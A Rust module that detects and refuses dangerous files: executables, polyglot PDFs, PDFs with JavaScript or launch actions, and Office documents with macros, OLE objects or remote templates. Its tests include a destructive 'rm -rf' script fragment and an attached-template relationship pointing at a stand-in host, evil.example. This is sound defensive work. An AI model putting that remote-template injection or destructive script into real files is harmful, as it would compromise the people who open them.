//! Dangerous and disguised files are refused before anything is read from them (pillar 3).
//!
//! ATENA keeps no original files, but it reads them, and a source that serves programs or
//! documents with active content is not drawn on: such a file is refused as a whole and nothing
//! of it is kept. Refused are:
//! * programs and scripts, whatever the server calls them (Windows, Linux and macOS executables,
//!   Java classes, `#!` scripts);
//! * files that only pretend to be a PDF – a PDF signature after other data is the mark of a
//!   polyglot file built to be read as two different things;
//! * PDFs with JavaScript, launch actions, embedded files, rich media (Flash) or XFA forms;
//! * Word documents with macros, ActiveX controls, embedded OLE objects or remote templates;
//!   OpenDocument texts with macros or scripts.

use pdf_extract::{Document, Object};

/// Leading white space tolerated before a PDF signature (some servers emit a line break first).
const PDF_LEADING_SPACE: usize = 16;

/// What kind of program `head` starts with, if any.
pub(crate) fn executable(head: &[u8]) -> Option<&'static str> {
    let starts = |magic: &[u8]| head.starts_with(magic);
    if starts(b"MZ") {
        Some("a Windows program")
    } else if starts(b"\x7fELF") {
        Some("a Linux program")
    } else if [
        &b"\xfe\xed\xfa\xce"[..],
        b"\xce\xfa\xed\xfe",
        b"\xfe\xed\xfa\xcf",
        b"\xcf\xfa\xed\xfe",
    ]
    .iter()
    .any(|m| starts(m))
    {
        Some("a macOS program")
    } else if starts(b"\xca\xfe\xba\xbe") {
        Some("a Java class or macOS program")
    } else if starts(b"#!") {
        Some("a script")
    } else {
        None
    }
}

/// `true` when the file starts with a PDF signature (after a little white space at most).
pub(crate) fn is_pdf(body: &[u8]) -> bool {
    let start = body
        .iter()
        .take(PDF_LEADING_SPACE)
        .take_while(|b| b.is_ascii_whitespace())
        .count();
    body[start..].starts_with(b"%PDF-")
}

/// `true` when a PDF signature hides behind other, binary data in the first kilobyte – a file
/// built to be read as two different things. (A web page that merely mentions `%PDF-` is text.)
pub(crate) fn disguised_pdf(head: &[u8]) -> bool {
    head.windows(5).any(|w| w == b"%PDF-")
        && head.iter().any(|b| *b < 0x09 || (0x0e..0x20).contains(b))
}

/// Active content in a loaded PDF, if any. Every object is examined, including those that came
/// out of compressed object streams.
pub(crate) fn pdf_active_content(doc: &Document) -> Option<&'static str> {
    for object in doc.objects.values() {
        let dict = match object {
            Object::Dictionary(d) => d,
            Object::Stream(s) => &s.dict,
            _ => continue,
        };
        for (key, value) in dict.iter() {
            let found = match key.as_slice() {
                b"JS" | b"JavaScript" => Some("JavaScript"),
                b"Launch" => Some("a launch action"),
                b"EmbeddedFiles" | b"EF" => Some("embedded files"),
                b"RichMedia" | b"RichMediaContent" => Some("rich media"),
                b"XFA" => Some("an XFA form"),
                b"S" | b"Type" | b"Subtype" => match value {
                    Object::Name(name) => match name.as_slice() {
                        b"JavaScript" => Some("JavaScript"),
                        b"Launch" => Some("a launch action"),
                        b"ImportData" => Some("an import action"),
                        b"EmbeddedFile" => Some("embedded files"),
                        b"RichMedia" => Some("rich media"),
                        _ => None,
                    },
                    _ => None,
                },
                _ => None,
            };
            if found.is_some() {
                return found;
            }
        }
    }
    None
}

/// Active content in an office archive, judged by its part names and, for the parts that
/// declare content types and relationships, their text.
pub(crate) fn office_active_content(
    names: &[String],
    text_of: &mut dyn FnMut(&str) -> Option<String>,
) -> Option<&'static str> {
    for name in names {
        let lower = name.to_ascii_lowercase();
        let file = lower.rsplit('/').next().unwrap_or(&lower);
        if file.starts_with("vbaproject") || file.starts_with("vbadata") {
            return Some("macros");
        }
        if lower.contains("/activex/") || lower.starts_with("activex/") {
            return Some("ActiveX controls");
        }
        if file.starts_with("oleobject")
            || (lower.contains("/embeddings/") && file.ends_with(".bin"))
        {
            return Some("embedded OLE objects");
        }
        if lower.starts_with("basic/") || lower.starts_with("scripts/") {
            return Some("macros");
        }
    }
    if text_of("[Content_Types].xml").is_some_and(|t| t.contains("macroEnabled")) {
        return Some("macros");
    }
    for rels in names.iter().filter(|n| n.ends_with(".rels")) {
        let Some(xml) = text_of(rels) else { continue };
        // a remote template, frame or object is fetched by Word when the file is opened
        for relationship in xml.split("<Relationship").skip(1) {
            let external = relationship.contains("TargetMode=\"External\"");
            let remote = [
                "attachedTemplate\"",
                "oleObject\"",
                "frame\"",
                "subDocument\"",
            ]
            .iter()
            .any(|t| relationship.contains(t));
            if external && remote {
                return Some("remote content loaded when opened");
            }
        }
    }
    if text_of("content.xml").is_some_and(|t| t.contains("script:event-listener")) {
        return Some("scripts");
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn programs_are_recognised() {
        assert_eq!(executable(b"MZ\x90\x00"), Some("a Windows program"));
        assert_eq!(executable(b"\x7fELF\x02"), Some("a Linux program"));
        assert_eq!(executable(b"#!/bin/sh\nrm -rf"), Some("a script"));
        assert_eq!(executable(b"%PDF-1.7"), None);
        assert_eq!(executable(b"<html>"), None);
    }

    #[test]
    fn pdf_signatures_must_come_first() {
        assert!(is_pdf(b"%PDF-1.7\n"));
        assert!(is_pdf(b"\r\n%PDF-1.4"));
        assert!(!is_pdf(b"MZ....%PDF-1.4"));
        assert!(disguised_pdf(b"\x00\x01junk%PDF-1.4"));
        assert!(!disguised_pdf(b"<p>A PDF file starts with %PDF-1.7</p>"));
    }

    #[test]
    fn active_office_parts_are_found() {
        let names = |list: &[&str]| list.iter().map(|s| s.to_string()).collect::<Vec<_>>();
        let mut none = |_: &str| None;
        assert_eq!(
            office_active_content(
                &names(&["word/document.xml", "word/vbaProject.bin"]),
                &mut none
            ),
            Some("macros")
        );
        assert_eq!(
            office_active_content(&names(&["word/embeddings/oleObject1.bin"]), &mut none),
            Some("embedded OLE objects")
        );
        assert_eq!(
            office_active_content(&names(&["Basic/Standard/Module1.xml"]), &mut none),
            Some("macros")
        );
        let rels = r#"<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://evil.example/t.dotm" TargetMode="External"/></Relationships>"#;
        let mut with_rels =
            |name: &str| (name == "word/_rels/settings.xml.rels").then(|| rels.to_string());
        assert_eq!(
            office_active_content(
                &names(&["word/document.xml", "word/_rels/settings.xml.rels"]),
                &mut with_rels
            ),
            Some("remote content loaded when opened")
        );
        // an ordinary link to a web page is external too, and harmless
        let link = r#"<Relationship Id="r2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.minedu.sk/" TargetMode="External"/>"#;
        let mut with_link =
            |name: &str| (name == "word/_rels/document.xml.rels").then(|| link.to_string());
        assert_eq!(
            office_active_content(
                &names(&["word/document.xml", "word/_rels/document.xml.rels"]),
                &mut with_link
            ),
            None
        );
    }
}
